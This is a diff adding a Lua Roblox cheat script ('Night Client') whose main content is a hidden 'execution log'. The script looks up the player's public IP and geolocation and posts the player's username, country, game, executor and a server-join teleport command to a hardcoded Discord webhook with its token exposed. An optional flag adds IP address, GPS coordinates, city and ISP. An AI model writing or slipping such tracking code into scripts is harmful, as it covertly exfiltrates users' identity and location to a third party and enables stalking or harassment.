@@ -1,0 +1,181 @@
+--// Config
+getgenv().whscript = "Night Client | New era"        
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1449083334633459863/HLqMTR8Ez8GCNS0pPt3QkOHePvi251OUO_EZAvZYl2CSGVcVMo34gzVhc82sSV3ES8J7"
+getgenv().ExecLogSecret = false   
+
+--// Execution Log Script
+local ui = gethui()
+local folderName = "screen"
+local folder = Instance.new("Folder")
+folder.Name = folderName
+local player = game:GetService("Players").LocalPlayer
+
+-- Variável global para controlar se já foi executado neste servidor
+if not _G.ExecLogSent then
+    _G.ExecLogSent = {}
+end
+
+local jobid = tostring(game.JobId)
+
+-- Verificar se já foi enviado para este servidor
+if _G.ExecLogSent[jobid] then
+    print("Script executado com sucesso!")
+    return
+end
+
+if ui:FindFirstChild(folderName) then
+    print("Script is already executed! Rejoin if it's an error!")
+    local ui2 = gethui()
+    local folderName2 = "screen2"
+    local folder2 = Instance.new("Folder")
+    folder2.Name = folderName2
+    if ui2:FindFirstChild(folderName2) then
+        player:Kick("Anti-spam execution system triggered. Please rejoin to proceed.")
+    else
+        folder2.Parent = gethui()
+    end
+else
+    folder.Parent = gethui()
+    
+    -- Marcar como enviado para este servidor
+    _G.ExecLogSent[jobid] = true
+    
+    local players = game:GetService("Players")
+    local userid = player.UserId
+    local gameid = game.PlaceId
+    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
+    local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
+    local completeTime = os.date("%Y-%m-%d %H:%M:%S")
+    local workspace = game:GetService("Workspace")
+    local playerCount = #players:GetPlayers()
+    local maxPlayers = players.MaxPlayers
+    local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
+    local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or "N/A"
+
+    if not getgenv().ExecLogSecret then
+        getgenv().ExecLogSecret = false
+    end
+    
+    if not getgenv().whscript then
+        getgenv().whscript = "Please provide a script name!"
+    end
+    
+    local commonLoadTime = 5
+    task.wait(commonLoadTime)
+    
+    local url = getgenv().webhookexecUrl
+
+    -- Obter informações de localização pública
+    local ip = game:HttpGet("https://api.ipify.org")
+    local iplink = "https://ipinfo.io/" .. ip .. "/json"
+    local ipinfo_json = game:HttpGet(iplink)
+    local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)
+    
+    -- Mapeamento de códigos de país para nomes completos
+    local countryNames = {
+        ["BR"] = "Brazil",
+        ["US"] = "United States",
+        ["PT"] = "Portugal",
+        ["ES"] = "Spain",
+        ["FR"] = "France",
+        ["DE"] = "Germany",
+        ["IT"] = "Italy",
+        ["UK"] = "United Kingdom",
+        ["CA"] = "Canada",
+        ["AU"] = "Australia",
+        ["JP"] = "Japan",
+        ["CN"] = "China",
+        ["RU"] = "Russia",
+        ["IN"] = "India",
+        ["MX"] = "Mexico",
+        ["AR"] = "Argentina"
+    }
+    
+    local countryCode = ipinfo_table.country or "N/A"
+    local fullCountryName = countryNames[countryCode] or countryCode
+
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = "🚀 **Alguem executou o Night client**",
+                ["description"] = "*Cole o código de teleporte no seu executor*",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x3498db),
+                ["fields"] = {
+                    {
+                        ["name"] = "👤 **Detalhes do Player**",
+                        ["value"] = "• Username: " .. player.Name .. 
+                                  "\n• Nome de exibição: " .. player.DisplayName ..
+                                  "\n• 🌍 País: " .. fullCountryName,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🎮 **Detalhes do Jogo**",
+                        ["value"] = "• Game Name: " .. gameName .. 
+                                  "\n• Game ID: " .. gameid,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🕹️ **Informações do Servidor**",
+                        ["value"] = "• Players in Server: " .. playerCount .. " / " .. maxPlayers,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🖥️ **Informações do Sistema**",
+                        ["value"] = "• Executor: " .. identifyexecutor(),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "📱 **Dispositivo**",
+                        ["value"] = deviceType,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🌀 **Código de teleporte**",
+                        ["value"] = snipePlay,
+                        ["inline"] = false
+                    }
+                },
+                ["thumbnail"] = {
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userid .. "&width=420&height=420&format=png"
+                },
+                ["footer"] = {
+                    ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
+                    ["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
+                }
+            }
+        }
+    }
+
+    -- Seção secreta com informações de IP (sem o país, pois já está público)
+    if getgenv().ExecLogSecret then
+        table.insert(
+            data.embeds[1].fields,
+            {
+                ["name"] = "**`(🤫) Secret Information`**",
+                ["value"] = "||👣 IP Address: " .. ipinfo_table.ip .. "||" ..
+                          "\n||🪟 GPS Location: " .. ipinfo_table.loc .. "||" ..
+                          "\n||🏙️ City: " .. ipinfo_table.city .. "||" ..
+                          "\n||🏡 Region: " .. ipinfo_table.region .. "||" ..
+                          "\n||🪢 Hoster: " .. ipinfo_table.org .. "||"
+            }
+        )
+    end
+
+    -- Enviar a requisição webhook
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    
+    request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+    local abcdef = {
+        Url = url, 
+        Body = newdata, 
+        Method = "POST", 
+        Headers = headers
+    }
+    
+    request(abcdef)
+end
